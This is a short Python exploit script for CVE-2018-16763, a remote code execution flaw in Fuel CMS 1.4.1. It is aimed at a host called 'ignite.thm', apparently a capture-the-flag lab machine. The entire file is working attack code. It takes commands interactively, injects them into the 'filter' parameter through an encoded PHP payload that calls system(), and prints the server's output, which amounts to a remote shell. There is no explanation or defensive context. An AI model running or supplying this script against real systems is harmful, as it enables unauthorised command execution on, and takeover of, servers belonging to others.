# CVE-2018-16763 — Fuel CMS 1.4.1 Remote Code Execution
# Exploit adapted for Python 3

import requests
import urllib.parse

def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

url = "http://ignite.thm"

while True:
    cmd = input("cmd: ")
    encoded_cmd = urllib.parse.quote(cmd)
    payload = "%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27" + encoded_cmd + "%27%29%2b%27"
    full_url = f"{url}/fuel/pages/select/?filter={payload}"

    try:
        r = requests.get(full_url)
        html_start = "<!DOCTYPE html>"
        marker = r.text[0:20]
        dup = find_nth_overlapping(r.text, marker, 2)
        print("\n--- Output ---")
        print(r.text[0:dup])
        print("--------------\n")
    except Exception as e:
        print(f"[!] Request failed: {e}")

